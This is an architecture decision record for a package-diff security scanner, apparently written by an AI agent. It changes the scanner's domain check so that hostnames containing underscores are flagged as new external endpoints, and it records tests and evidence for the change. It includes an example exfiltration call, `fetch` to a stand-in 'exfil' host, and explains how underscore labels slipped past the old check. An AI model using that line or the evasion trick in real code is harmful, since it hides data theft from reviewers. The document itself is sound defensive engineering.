# ADR-029: Keep non-TLD labels that contain an underscore

- **Status:** Accepted (agent, 2026-10-22, Tier 2 under CLAUDE.md "Autonomy")
- **Date:** 2026-10-22
- **Plan reference:** PLAN §4.4 (new external domain in literals), CLAUDE.md "Autonomy", Tier 2

## Context

`publicStyleDomain` (`src/core/signal-extractor.ts:509`) drops a host whose
labels are not letters, digits and hyphens. `new URL("https://a_b.evil.test/x")`
returns `a_b.evil.test` as its hostname, and `getaddrinfo` resolves names with
underscores. DNS allows any octet in a label, and an attacker controls the
records of their own zone. So `fetch("https://a_b.exfil.example.test/x")`
reaches the host while capdelta reports no endpoint.

The LDH rule came from #40, which was guarding against documentation links in
comments and URL-parser artifacts such as `$addr`, `fs` and
`"underscorejs.org)"`. It treated underscores as unlikely in a public name,
not as a reported source of noise.

## Decision

Allow `_` anywhere in every label except the TLD. The TLD keeps the existing
rule (an alphabetic or punycode pattern) and its label regex, so
`example.co_m` stays dropped. Every other rule in `isPublicStyleDomain` is
unchanged: at least two labels, 253 characters maximum, 63 characters per
label, no leading or trailing hyphen, and no `$` placeholders.

## Alternatives rejected

Keep the LDH rule and document the gap. Rejected because the attacker controls
the zone, so the host is reachable and the finding is real.
Allow underscores in the TLD too. Rejected because an underscore in the TLD is
not a public suffix npm or a browser will resolve as a domain, and the ticket
keeps today's TLD rule.

## Consequences

A host with an underscore label now produces `new-external-endpoint`, so the
gate gets louder. The change can add findings, never drop one. The unit test
that asserted the drop moves to the keeps table. A new `underscore-label`
reconstruction proves the HIGH finding end to end.

Revisit if the held-out corpus shows real noise from underscore hosts. The
common legitimate cases are service labels such as `_dmarc`, which are not
usually fetched by package code.

## Evidence

- Runtime: `new URL("https://a_b.evil.test/x").hostname` is `a_b.evil.test`,
  and `dns.lookup("a_b.localhost")` returns `::1` like `ab.localhost`, so
  getaddrinfo does not reject the underscore.
- Reconstruction `underscore-label`: with `src/` at main the test gets no
  finding; on this branch it gets HIGH `new external domain
a_b.exfil.example.test`.
- Held-out corpus (`scripts/m5-measure.ts run`, 45 pairs): identical to main
  at ff1a5de, 0 default-gate failures before and after. No new finding to
  label.
- CLI replay (`verify-capdelta` replay, 20 drives): byte-identical to
  `run5-main154`.
- `npm run difffuzz -- --base origin/main` and `--narrow`: 0 of 500000. The
  fuzz fragments hold no `_`, so this only shows nothing else moved.
- Codex security review: APPROVE.

## How to revert

Revert the squash commit. The only behavior change is in
`publicStyleDomain`; the `underscore-label` reconstruction and its test then
fail and must be removed with it.
